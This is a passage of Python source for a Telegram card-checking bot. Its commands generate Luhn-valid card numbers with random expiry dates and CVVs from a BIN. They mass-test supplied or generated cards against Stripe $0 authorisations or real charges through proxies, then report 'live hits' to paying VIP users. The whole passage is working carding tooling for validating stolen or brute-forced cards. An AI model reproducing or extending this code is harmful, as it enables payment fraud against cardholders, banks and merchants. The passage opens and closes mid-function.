[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== /chk — Non-SK Single Card Checker ==================
def _chk_get_amount(text):
    """Extract optional explicit amount from /chk command text.
    Returns formatted amount string (e.g. '2.50') if found, else None."""
    for part in (text or '').split():
        try:
            amt = float(part)
            if 0.01 <= amt <= 9999:
                return f"{amt:.2f}"
        except ValueError:
            pass
    return None

def _chk_classify(result):
    """Classify stripe_auth result → (emoji, top_banner, box_banner, is_hit, is_insuf)."""
    rl = result.lower()
    if "approved" in rl and ("insufficient" in rl or "funds" in rl):
        return "💰", "✨ ✦ ─── I N S U F F I C I E N T ─── ✦ ✨", "╔══════════════════════════╗\n║  💰  INSUFFICIENT FUNDS   ║\n╚══════════════════════════╝", False, True
    if result.strip().upper() == "CCN":
        return "❌", "✨ ✦ ─── D E C L I N E D ─── ✦ ✨", "╔══════════════════════════╗\n║  ❌  CCN — UNCONFIRMED    ║\n╚══════════════════════════╝", False, False
    if "approved" in rl:
        return "✅", "✨ ✦ ─── A P P R O V E D ─── ✦ ✨", "╔══════════════════════════╗\n║  ✅  CHARGED  —  HIT !    ║\n╚══════════════════════════╝", True, False
    if "otp" in rl or "3ds" in rl or "requires_action" in rl:
        return "⚠️", "⚠️ ─── O T P   R E Q U I R E D ─── ⚠️", "╔══════════════════════════╗\n║  ⚠️  3DS / OTP REQUIRED   ║\n╚══════════════════════════╝", False, False
    return "❌", "✨ ✦ ─── D E C L I N E D ─── ✦ ✨", "╔══════════════════════════╗\n║  ❌  DECLINED             ║\n╚══════════════════════════╝", False, False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   /lchk — BIN Gen + WCS Auth $0 Checker
#   BIN mode : auto-gen → stripe_auth_single (fast, site #1)
#   Single   : stripe_auth_ex  (multi-site, most reliable)
#   Mass file: stripe_auth_single per card
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=["lchk"])
def lchk_command(message):
    def _run():
        uid   = message.from_user.id
        proxy = get_proxy_dict(uid)

        _BIN_RE = re.compile(r'^[\dxX]{6,19}(\|[\dxX]*){0,3}$')

        # ── Parse raw args after command ───────────────────────────
        _txt   = (message.text or '').strip()
        _space = re.search(r'\s', _txt)
        args   = _txt[_space.end():].strip() if _space else ''

        # ── Mode detection ─────────────────────────────────────────
        _args_first   = args.split()[0] if args else ''
        _has_full_card = bool(re.search(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', args))
        _is_bin_mode  = (
            bool(_args_first)
            and bool(_BIN_RE.match(_args_first))
            and not _has_full_card
            and len(_args_first.replace('x','').replace('X','').replace('|','')) >= 6
        )

        # ── Usage ──────────────────────────────────────────────────
        if not args and not message.reply_to_message:
            bot.reply_to(message, UI.fmt_error(
                "Usage:\n\n"
                "<code>.lchk BIN</code>              → gen 20 + Auth $0\n"
                "<code>.lchk BIN N</code>             → gen N + Auth $0\n"
                "<code>.lchk BIN|mm|yy|cvv N</code>   → template + Auth $0\n"
                "<code>.lchk card</code>               → single card Auth $0\n"
                "Reply to card list file with <code>.lchk</code>",
                example=".lchk 411111 50"
            ), parse_mode='HTML')
            return

        log_command(message, query_type='gateway', gateway='lchk')

        _GATE = 'WCS SetupIntent'
        _SEP  = '─────────────────────────────'
        _SIG  = "⌤ <a href='https://t.me/yadistan'>@yadistan</a>"

        # ════════════════════════════════════════════════════════════
        # MODE A — BIN → GEN → stripe_auth_single
        # ════════════════════════════════════════════════════════════
        if _is_bin_mode:
            parts_args = args.split()
            bin_input  = parts_args[0].strip()
            gen_count  = 20
            if len(parts_args) > 1:
                try:
                    gen_count = max(1, min(int(parts_args[1]), 500))
                except ValueError:
                    gen_count = 20

            has_pipe = '|' in bin_input
            if has_pipe:
                bp       = bin_input.split('|')
                bin_base = bp[0].strip()
                mm_tpl   = bp[1].strip() if len(bp) > 1 else 'xx'
                yy_tpl   = bp[2].strip() if len(bp) > 2 else 'xx'
                cvv_tpl  = bp[3].strip() if len(bp) > 3 else 'xxx'
            else:
                bin_base = bin_input.replace('x','').replace('X','')
                mm_tpl = yy_tpl = 'xx'
                cvv_tpl = 'xxx'

            bin_clean6 = bin_base.replace('x','').replace('X','')[:6]
            if len(bin_clean6) < 6 or not bin_clean6.isdigit():
                bot.reply_to(message, "<b>❌ BIN must be at least 6 digits.</b>", parse_mode='HTML')
                return

            is_amex = bin_base[0] == '3'
            clen    = 15 if is_amex else 16
            cvv_len = 4  if is_amex else 3

            def _gen_one():
                cc = ''.join(str(random.randint(0,9)) if c.lower()=='x' else c for c in bin_base)
                while len(cc) < clen - 1:
                    cc += str(random.randint(0,9))
                for d in range(10):
                    if _luhn_valid(cc + str(d)):
                        cc += str(d); break
                mm  = str(random.randint(1,12)).zfill(2) if mm_tpl.lower() in ('xx','x','') else mm_tpl.zfill(2)
                cur = datetime.now().year % 100
                yy  = str(random.randint(cur+1, cur+5)).zfill(2) if yy_tpl.lower() in ('xx','x','') else yy_tpl.zfill(2)
                cvv = (str(random.randint(1000,9999)) if is_amex else str(random.randint(100,999)).zfill(3)) \
                      if cvv_tpl.lower() in ('xxx','xxxx','xx','x','') else cvv_tpl.zfill(cvv_len)
                return f"{cc}|{mm}|{yy}|{cvv}"

            cards = []; seen = set(); att = 0
            while len(cards) < gen_count and att < gen_count * 10:
                c = _gen_one()
                if c not in seen:
                    seen.add(c); cards.append(c)
                att += 1

            total = len(cards)
            bin_info, bank, country, country_code = get_bin_info(bin_clean6)
            _b  = bin_info if bin_info and bin_info not in ('Unknown','Unknown - ','') else '—'
            _bk = bank if bank and bank not in ('Unknown','') else '—'
            _cc = country_code if country_code and country_code not in ('N/A','??','','Unknown') else ''
            _ct = f"{country} ({_cc})" if _cc else (country or '—')

            try:
                stopuser[f'{uid}']['status'] = 'start'
            except Exception:
                stopuser[f'{uid}'] = {'status': 'start'}

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton("🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

            msg = bot.reply_to(message,
                f"<b>🔍 LuhnChk — Gen + Auth $0\n"
                f"{_SEP}\n"
                f"│  🔢  BIN       ›  <code>{bin_clean6}</code>\n"
                f"│  🏦  BIN Info  ›  {_b}\n"
                f"│  🏛️  Bank      ›  {_bk}\n"
                f"│  🌍  Country   ›  {_ct}\n"
                f"│  ⚡  Gate      ›  {_GATE}\n"
                f"│  📦  Generating ›  {total} cards\n"
                f"{_SEP}\n"
                f"│  ⏳  Starting check...</b>",
                reply_markup=stop_kb, parse_mode='HTML'
            )

            live = dead = insuf = 0
            results_lines = []
            hits = []

            for i, card in enumerate(cards, 1):
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    break
                t0 = time.time()
                result, gw_lbl = stripe_auth_single(card, proxy)
                emoji, _, _, is_hit, is_insuf = _chk_classify(result)

                if is_hit:
                    live += 1
                    hits.append(card)
                    results_lines.append(f'✅ {card}')
                elif is_insuf:
                    insuf += 1
                    results_lines.append(f'💰 {card}')
                else:
                    dead += 1
                    results_lines.append(f'❌ {card}')

                if i % 5 == 0 or i == total:
                    stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
                    status  = '🛑' if stopped else ('✅' if i == total else '⏳')
                    bar = '█' * int(i/total*10) + '░' * (10 - int(i/total*10))
                    pct = int(i/total*100)
                    recent = results_lines[-10:]
                    rblock = ('\n│\n' + '\n'.join(f'│  {r}' for r in recent)) if recent else ''
                    _sl = '🛑 <b>Stopped</b>' if stopped else ('✅ <b>Done!</b>' if i == total else '⏳ <b>Checking...</b>')
                    try:
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=msg.message_id,
                            parse_mode='HTML',
                            reply_markup=stop_kb if not stopped else None,
                            text=(
                                f"<b>🔍 LuhnChk — Gen + Auth $0\n"
                                f"{_SEP}\n"
                                f"│  🔢  BIN       ›  <code>{bin_clean6}</code>  ·  {_b}\n"
                                f"│  ⚡  Gate      ›  {_GATE}\n"
                                f"│  🔰  Status    ›  {_sl}\n"
                                f"│  📊  Progress  ›  [{bar}] {pct}%\n"
                                f"│  🏁  Checked   ›  {i} / {total}\n"
                                f"│  ✅  Live      ›  {live}\n"
                                f"│  💰  Insuf     ›  {insuf}\n"
                                f"│  ❌  Dead      ›  {dead}"
                                f"{rblock}\n"
                                f"{_SEP}\n"
                                f"       {_SIG}</b>"
                            )
                        )
                    except Exception:
                        pass

            # Final hits block
            if hits:
                hits_block = '\n'.join(hits)
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
                bot.reply_to(message,
                    f"<b>🔍 LuhnChk — Live Hits\n"
                    f"{_SEP}\n"
                    f"│  🔢  BIN     ›  <code>{bin_clean6}</code>  ·  {_b}\n"
                    f"│  ⚡  Gate    ›  {_GATE}\n"
                    f"│  ✅  Live    ›  {live} / {total}\n"
                    f"│  💰  Insuf   ›  {insuf}\n"
                    f"│  ❌  Dead    ›  {dead}\n"
                    f"{_SEP}</b>\n"
                    f"<code>{hits_block}</code>",
                    parse_mode='HTML', reply_markup=kb
                )
            return

        # ════════════════════════════════════════════════════════════
        # MODE B — PROVIDED CARDS (inline or file reply)
        # ════════════════════════════════════════════════════════════
        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message, UI.fmt_error(
                "No cards found.\n\n"
                "Provide a BIN to auto-generate:  <code>.lchk 411111 50</code>\n"
                "Or paste cards directly / reply to a file.",
            ), parse_mode='HTML')
            return

        # ── SINGLE CARD ───────────────────────────────────────────
        if len(cards) == 1:
            card = cards[0]
            p    = card.split('|')
            num  = p[0]

            msg_wait = bot.reply_to(message,
                f"<b>🔍 LuhnChk — Checking...\n"
                f"<code>{card}</code>\n"
                f"⚡ Gate: {_GATE} ⏳</b>",
                parse_mode='HTML'
            )

            t0 = time.time()
            result, gw_lbl = stripe_auth_ex(card, proxy)
            elapsed = time.time() - t0

            emoji, _, _, is_hit, is_insuf = _chk_classify(result)
            bin_info, bank, country, country_code = get_bin_info(num[:6])
            network = _card_network(num)

            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg_wait.message_id,
                parse_mode='HTML',
                reply_markup=kb,
                disable_web_page_preview=True,
                text=UI.fmt_single(
                    'chk', card, emoji, result,
                    gate_name=f'{_GATE} · {gw_lbl}',
                    bin_info=bin_info, bank=bank,
                    country=country, country_code=country_code,
                    elapsed=elapsed,
                    extra_fields=[('Network', f"{network} ({len(num)}-digit)")]
                )
            )
            return

        # ── MASS CARD MODE ────────────────────────────────────────
        total = len(cards)
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton("🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        msg = bot.reply_to(message,
            UI.fmt_mass_header('chk', total, gate_name=_GATE),
            reply_markup=stop_kb, parse_mode='HTML'
        )

        live = dead = insuf = 0
        results_lines = []
        hits = []

        for i, card in enumerate(cards, 1):
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                break
            result, gw_lbl = stripe_auth_single(card, proxy)
            emoji, _, _, is_hit, is_insuf = _chk_classify(result)

            if is_hit:
                live += 1
                hits.append(card)
                results_lines.append(f'✅ {card}')
            elif is_insuf:
                insuf += 1
                results_lines.append(f'💰 {card}')
            else:
                dead += 1
                results_lines.append(f'❌ {card}')

            if i % 5 == 0 or i == total:
                stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
                status  = '🛑' if stopped else ('✅' if i == total else '⏳')
                try:
                    UI.send(bot, message,
                        UI.R.mass_progress(
                            'chk', i, total, live, dead,
                            gate_name=_GATE,
                            secondary=insuf, secondary_emoji='💰',
                            secondary_label='Insuf',
                            results_lines=results_lines,
                            status=status,
                        ),
                        edit_msg=msg, stop_button=not stopped
                    )
                except Exception:
                    pass

        if hits:
            UI.send(bot, message, UI.R.mass_hits('chk', hits, total))

    threading.Thread(target=_run).start()


@bot.message_handler(commands=["chk"])
def chk_command(message):
    def my_function():
        uid = message.from_user.id
        json_data = _load_data()
        try:
            BL = json_data[str(uid)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n"
                "/chk 4111111111111111|12|25|123\n"
                "/chk 4111111111111111|12|25|123 5\n"
                "/chk card1\ncard2\ncard3\n\n"
                "<i>💡 Single card → instant result | Multiple cards → mass check\n"
                "Amount optional → no amount = $0 auth | amount = real charge via DrGaM</i></b>",
                parse_mode='HTML')
            return

        amount  = _chk_get_amount(message.text or '')
        proxy   = get_proxy_dict(uid)
        log_command(message, query_type='gateway', gateway='chk')

        # ══════════════════════════════════════════════════════════════════
        # SINGLE CARD MODE
        # ══════════════════════════════════════════════════════════════════
        if len(cards) == 1:
            allowed, wait = check_rate_limit(uid, BL)
            if not allowed:
                bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
                return
            card = cards[0]
            _amt_line = f"💵 Amount: <b>${amount}</b> (DrGaM)" if amount else "💵 Mode: <b>$0 Auth</b> (WCS)"
            msg = bot.reply_to(message,
                f"<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱... ⏳\n{_amt_line}</b>",
                parse_mode='HTML')
            bin_info, bank, country, country_code = get_bin_info(card[:6])
            t0 = time.time()
            if amount:
                result = drgam_charge(card, proxy, amount=amount)
            else:
                result, _ = stripe_auth_ex(card, proxy)
            elapsed = time.time() - t0
            log_card_check(uid, card, 'chk', result, exec_time=elapsed)
            if amount:
                # DrGaM results: classify using dr logic
                _dr_e, _dr_hit, _, _dr_ins = _dr_classify(result)
                if _dr_hit:
                    emoji, _top, _box = "✅", "✨ ✦ ─── C H A R G E D ─── ✦ ✨", "╔══════════════════════════╗\n║  ✅  CHARGED  —  HIT !    ║\n╚══════════════════════════╝"
                elif _dr_ins:
                    emoji, _top, _box = "💰", "✨ ✦ ─── I N S U F F I C I E N T ─── ✦ ✨", "╔══════════════════════════╗\n║  💰  INSUFFICIENT FUNDS   ║\n╚══════════════════════════╝"
                else:
                    emoji, _top, _box = "❌", "✨ ✦ ─── D E C L I N E D ─── ✦ ✨", "╔══════════════════════════╗\n║  ❌  DECLINED             ║\n╚══════════════════════════╝"
            else:
                emoji, _top, _box, _, _ = _chk_classify(result)
            _cc_show   = country_code if country_code not in ('N/A', '??', '', 'Unknown') else ''
            _gate_line = f"DrGaM ${amount}" if amount else "WCS SetupIntent"
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                reply_markup=kb, parse_mode='HTML',
                disable_web_page_preview=True,
                text=UI.fmt_single(
                    "chk", card, emoji, result,
                    gate_name=_gate_line,
                    bin_info=bin_info, bank=bank,
                    country=country, country_code=_cc_show,
                    elapsed=elapsed, amount=amount
                ))
            return

        # ══════════════════════════════════════════════════════════════════
        # MASS MODE  (concurrent — 5 workers)  — same as /chkm but no BIN gen
        # ══════════════════════════════════════════════════════════════════
        total = len(cards)
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        _gate_tag = f"DrGaM ${amount}" if amount else "WCS $0 Auth"
        msg = bot.reply_to(message,
            UI.fmt_mass_header("chk", total, gate_name=_gate_tag, amount=amount),
            reply_markup=stop_kb, parse_mode='HTML')
        live = 0; dead = 0; insufficient = 0; checked = 0
        results_lines = []; approved_hits = []
        lock = threading.Lock()
        _live_hit_holder = [None, []]

        def build_chk_mass(status="⏳"):
            return UI.fmt_mass_progress(
                "chk", checked, total, live, dead,
                gate_name=_gate_tag, secondary=insufficient,
                secondary_emoji="💰", secondary_label="Insuf",
                results_lines=results_lines, status=status, amount=amount
            )

        def _chk_check_one(cc):
            nonlocal live, dead, insufficient, checked
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                return
            cc = cc.strip()
            if amount:
                result = drgam_charge(cc, proxy, amount=amount)
            else:
                result, _ = stripe_auth_single(cc, proxy)
            res_low    = result.lower()
            emoji, is_live, is_insuf = "❌", False, False
            if amount:
                # DrGaM returns: "Approved", "Charge !!", "Charged", "Successful", "Insufficient", etc.
                _dr_hits = ("approved", "charge !!", "charged", "successful")
                _insuf_kw = ("insufficient", "3ds", "otp", "requires")
                if any(x in res_low for x in _insuf_kw):
                    emoji = "💰"; is_insuf = True; label = "Insufficient/3DS"
                elif any(x in res_low for x in _dr_hits):
                    emoji = "✅"; is_live = True; label = f"Charged ${amount}"
                else:
                    label = result[:25]
            else:
                if "approved" in res_low and ("insufficient" in res_low or "funds" in res_low):
                    emoji = "💰"; is_insuf = True; label = "Insufficient"
                elif "approved" in res_low:
                    emoji = "✅"; is_live = True; label = "Approved"
                else:
                    label = result[:25]
            with lock:
                checked += 1
                if is_live:    live += 1; approved_hits.append(cc); _add_to_merge(uid, cc)
                elif is_insuf: insufficient += 1
                else:          dead += 1
                results_lines.append(f"{emoji} <b>{label}</b>  ·  <code>{cc}</code>")
            if is_live:
                _notify_live_hit(message.chat.id, cc, "chkm", holder=_live_hit_holder)
            try:
                sk = types.InlineKeyboardMarkup()
                sk.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_chk_mass(), parse_mode='HTML', reply_markup=sk)
            except Exception:
                pass

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(_chk_check_one, cc): cc for cc in cards}
            for fut in as_completed(futures):
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    pool.shutdown(wait=False); break
                try: fut.result()
                except Exception: pass

        stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                text=build_chk_mass("🛑" if stopped else "✅"),
                parse_mode='HTML', reply_markup=kb, disable_web_page_preview=True)
        except Exception:
            pass
        if approved_hits:
            try:
                hits_kb = types.InlineKeyboardMarkup(row_width=2)
                hits_kb.add(types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                            types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot"))
                bot.send_message(message.chat.id,
                    UI.fmt_mass_hits("chk", approved_hits, total, amount=amount),
                    parse_mode='HTML', reply_markup=hits_kb, disable_web_page_preview=True)
            except Exception:
                pass

    threading.Thread(target=my_function).start()

# ================== /chkm — Non-SK Mass Checker ==================
@bot.message_handler(commands=["chkm"])
def chkm_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        # ── BIN auto-gen OR manual cards ──────────────────────────────
        _bin_gen_mode = False
        _bin_num_display = ''
        _bin_info_line = ''
        _bin_bank_line = ''
        _bin_cc_flag = ''
        cards = _get_cards_from_message(message)
        if not cards:
            # Try BIN auto-gen mode: .chkm BIN [count] or .chkm BIN|mm|yy|cvv [count]
            _raw_arg = message.text.split(' ', 1)[1].strip() if ' ' in message.text else ''
            _BIN_RE = re.compile(r'^([0-9xX]{6,19}(?:\|[0-9xX]{0,4}(?:\|[0-9xX]{0,4}(?:\|[0-9xX]{0,4})?)?)?)(?:\s+(\d+))?$', re.I)
            _bm = _BIN_RE.match(_raw_arg)
            if _bm and _raw_arg:
                _bin_gen_mode = True
                _bin_input = _bm.group(1).strip()
                _gen_count = int(_bm.group(2)) if _bm.group(2) else 10
                _gen_count = max(1, min(_gen_count, 500))
                # parse BIN parts
                if '|' in _bin_input:
                    _bp = _bin_input.split('|')
                    _bin_base = _bp[0].strip()
                    _mm_tpl   = _bp[1].strip() if len(_bp) > 1 else 'xx'
                    _yy_tpl   = _bp[2].strip() if len(_bp) > 2 else 'xx'
                    _cvv_tpl  = _bp[3].strip() if len(_bp) > 3 else 'xxx'
                else:
                    _bin_base = _bin_input
                    _mm_tpl = _yy_tpl = 'xx'
                    _cvv_tpl = 'xxx'
                _bin_base_clean = re.sub(r'[xX]', '', _bin_base)
                if len(_bin_base_clean) < 6:
                    bot.reply_to(message,
                        "<b>╔══════════════════════════╗\n"
                        "║  🔍  NON-SK MASS CHECKER  ║\n"
                        "╚══════════════════════════╝\n"
                        "│\n"
                        "│ 📌 Usage:\n"
                        "│  <code>/chkm card1</code>\n"
                        "│  <code>/chkm card1</code>\n"
                        "│  <code>  card2</code>\n"
                        "│  <code>  card3</code>\n"
                        "│\n"
                        "│ ⚡ OR BIN auto-gen mode:\n"
                        "│  <code>/chkm BIN</code>           → gen 10 + check\n"
                        "│  <code>/chkm BIN N</code>          → gen N + check\n"
                        "│  <code>/chkm BIN|mm|yy|cvv N</code>\n"
                        "│\n"
                        "│ 💡 Examples:\n"
                        "│  <code>/chkm 411111</code>\n"
                        "│  <code>/chkm 542532 20</code>\n"
                        "│  <code>/chkm 4111|12|26|xxx 15</code>\n"
                        "└──────────────────────────</b>",
                        parse_mode='HTML')
                    return
                # Luhn generator
                def _chkm_luhn_ok(n):
                    d = [int(x) for x in n]
                    odd = d[-1::-2]; even = d[-2::-2]
                    return (sum(odd) + sum(sum(divmod(x*2,10)) for x in even)) % 10 == 0
                _is_amex = _bin_base_clean[0] == '3'
                _clen    = 15 if _is_amex else 16
                _cvv_len = 4  if _is_amex else 3
                def _chkm_gen_one():
                    cc = ''.join(str(random.randint(0,9)) if c.lower()=='x' else c for c in _bin_base)
                    while len(cc) < _clen - 1:
                        cc += str(random.randint(0,9))
                    for dg in range(10):
                        if _chkm_luhn_ok(cc + str(dg)):
                            cc += str(dg); break
                    mm  = str(random.randint(1,12)).zfill(2) if _mm_tpl.lower() in ('xx','x','') else _mm_tpl.zfill(2)
                    cur = datetime.now().year % 100
                    yy  = str(random.randint(cur+1, cur+5)).zfill(2) if _yy_tpl.lower() in ('xx','x','') else _yy_tpl.zfill(2)
                    cvv = (str(random.randint(1000,9999)) if _is_amex else str(random.randint(100,999)).zfill(3)) if _cvv_tpl.lower() in ('xxx','xxxx','xx','x','') else _cvv_tpl.zfill(_cvv_len)
                    return f"{cc}|{mm}|{yy}|{cvv}"
                cards = []; _seen_g = set(); _att = 0
                while len(cards) < _gen_count and _att < _gen_count * 10:
                    _c = _chkm_gen_one()
                    if _c not in _seen_g:
                        _seen_g.add(_c); cards.append(_c)
                    _att += 1
                _bin_num_display = _bin_base_clean[:6]
                _bi, _bk, _bc, _bf = get_bin_info(_bin_num_display)
                _bin_info_line = _bi if _bi not in ('Unknown','Unknown - ','') else ''
                _bin_bank_line = _bk if _bk not in ('Unknown','') else '—'
                _bin_cc_flag   = _bf
            else:
                bot.reply_to(message,
                    "<b>╔══════════════════════════╗\n"
                    "║  🔍  NON-SK MASS CHECKER  ║\n"
                    "╚══════════════════════════╝\n"
                    "│\n"
                    "│ 📌 Usage:\n"
                    "│  <code>/chkm card1</code>\n"
                    "│  <code>card2</code>\n"
                    "│  <code>card3</code>\n"
                    "│\n"
                    "│ ⚡ OR BIN auto-gen mode:\n"
                    "│  <code>/chkm BIN</code>           → gen 10 + check\n"
                    "│  <code>/chkm BIN N</code>          → gen N + check\n"
                    "│  <code>/chkm BIN|mm|yy|cvv N</code>\n"
                    "│\n"
                    "│ 💡 Examples:\n"
                    "│  <code>/chkm 411111</code>\n"
                    "│  <code>/chkm 542532 20</code>\n"
                    "└──────────────────────────</b>",
                    parse_mode='HTML')
                return
        total = len(cards)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        if _bin_gen_mode:
            _start_txt = (
                f"<b>⚡ ════ GEN + CHKM ════ ⚡\n"
                f"│ 🎰 BIN: <code>{_bin_num_display}</code> {_bin_cc_flag}\n"
                f"│ 🏦 {_bin_bank_line}\n"
                f"│ 💳 {_bin_info_line}\n"
                f"│ 📋 Generating {total} cards...\n"
                f"└──────────────────────────\n"
                f"⏳ Starting...</b>"
            )
        else:
            _start_txt = f"<b>🔍 𝗡𝗼𝗻-𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>"
        msg = bot.reply_to(message, _start_txt, reply_markup=stop_kb, parse_mode='HTML')
        live = dead = insufficient = checked = 0
        results_lines = []
        approved_hits = []
        def build_msg(status="⏳ Checking..."):
            _pct = int(checked / total * 12) if total else 0
            _bar = '█' * _pct + '░' * (12 - _pct)
            if _bin_gen_mode:
                h = (
                    f"<b>⚡ ════ GEN + CHKM ════ ⚡\n"
                    f"╔══════════════════════════╗\n"
                    f"║  🔍  NON-SK MASS CHECKER  ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│ 🎰 BIN: <code>{_bin_num_display}</code> {_bin_cc_flag}  ·  {total} cards\n"
                    f"│ 🏦 {_bin_bank_line}  ·  💳 {_bin_info_line}\n"
                    f"│\n"
                    f"│ [{_bar}] {int(checked/total*100) if total else 0}%\n"
                    f"│ 🔢 {checked}/{total}  ·  {status}\n"
                    f"├──────────────────────────\n"
                    f"│ ✅ Live: {live}  💰 Funds: {insufficient}  ❌ Dead: {dead}\n"
                    f"│\n"
                )
            else:
                h = (
                    f"<b>✨ ✦ ─── C H K   M A S S ─── ✦ ✨\n"
                    f"╔══════════════════════════╗\n"
                    f"║  🔍  NON-SK MASS CHECKER  ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│ {status}\n"
                    f"│\n"
                    f"│ 📊 {checked}/{total}  ·  ✅ {live}  ·  💰 {insufficient}  ·  ❌ {dead}\n"
                    f"│\n"
                )
            body = "\n".join(results_lines[-15:])
            return h + body + f"\n└──────────────────────────\n       ⌤ Bot by @yadistan</b>"
        _live_hit_holder = [None, []]
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("🛑 STOPPED"), parse_mode='HTML')
                except:
                    pass
                if approved_hits:
                    try:
                        hits_kb = types.InlineKeyboardMarkup(row_width=2)
                        hits_kb.add(
                            types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                            types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot")
                        )
                        all_ccs = "\n".join(approved_hits)
                        bot.send_message(
                            chat_id=message.chat.id,
                            text=(
                                f"<b>✨ ✦ ─── L I V E   H I T S ─── ✦ ✨\n"
                                f"╔══════════════════════════╗\n"
                                f"║  ✅  A P P R O V E D  !  ║\n"
                                f"╚══════════════════════════╝\n"
                                f"│ 📊 Total Hits: {len(approved_hits)}/{total}\n"
                                f"└──────────────────────────</b>\n"
                                f"<code>{all_ccs}</code>"
                            ),
                            parse_mode='HTML',
                            reply_markup=hits_kb,
                            disable_web_page_preview=True
                        )
                    except:
                        pass
                return
            cc = cc.strip()
            start_time = time.time()
            result, gw_lbl = stripe_auth_single(cc, proxy)
            checked += 1
            res_low = result.lower()
            if "approved" in res_low and ("insufficient" in res_low or "funds" in res_low):
                status_emoji = "💰"; insufficient += 1
                label = "Insufficient"
            elif "approved" in res_low:
                status_emoji = "✅"; live += 1
                label = "Approved"
                approved_hits.append(cc)
                _add_to_merge(id, cc)
